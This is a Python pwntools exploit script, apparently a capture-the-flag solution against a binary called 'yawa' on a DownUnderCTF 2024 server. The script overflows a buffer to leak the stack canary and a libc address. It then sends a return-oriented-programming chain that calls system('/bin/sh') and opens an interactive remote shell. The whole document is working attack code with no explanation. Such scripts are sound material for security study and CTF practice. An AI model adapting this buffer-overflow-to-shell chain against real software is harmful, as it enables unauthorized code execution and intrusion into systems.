from pwn import *

binary_name = "yawa_patched"
exe  = ELF(binary_name, checksec=True)
libc = ELF("libc.so.6", checksec=False)
context.binary = exe

ru  = lambda *x, **y: r.recvuntil(*x, **y)
rl  = lambda *x, **y: r.recvline(*x, **y)
rc  = lambda *x, **y: r.recv(*x, **y)
sla = lambda *x, **y: r.sendlineafter(*x, **y)
sa  = lambda *x, **y: r.sendafter(*x, **y)
sl  = lambda *x, **y: r.sendline(*x, **y)
sn  = lambda *x, **y: r.send(*x, **y)

if args.REMOTE:
	r = connect("2024.ductf.dev", 30010)
elif args.GDB:
	r = gdb.debug(f"debug_dir/{binary_name}", """
		c
	""", aslr=False)
else:
	r = process(f"debug_dir/{binary_name}")

# leaking canary
sl(b"1")
sn(b"A"*89)
sla(b">", "2")
ru(b"A"*88)
canary = (rl()[1:-1]).strip()
canary = hex(u64(canary.ljust(8, b"\x00")))
canary = canary[3:]
canary = '0x' + canary + '00'
canary = int(canary, 16) 
success(f"canary: {hex(canary)}")
# leaking libc 
sn(b"A"*88+b"A"*8+b"A"*7+b"B")
sla(b">", b"2")
ru(b"B")
libc_leak = rl().strip()
libc_leak = u64(libc_leak.ljust(8, b"\x00")) - 0x29d90
success(f"libc_leak: {hex(libc_leak)}")
libc.address = libc_leak
# RCE
rop = ROP(libc)
pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
ret = rop.find_gadget([ 'ret']).address
payload = b"A"*88
payload += p64(canary)
payload += b"A"*8
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(next(libc.search(b"/bin/sh")))
payload += p64(libc.sym.system)

sla(b">", b"1")
sn(payload)
sla(b">",b"3")
r.interactive()
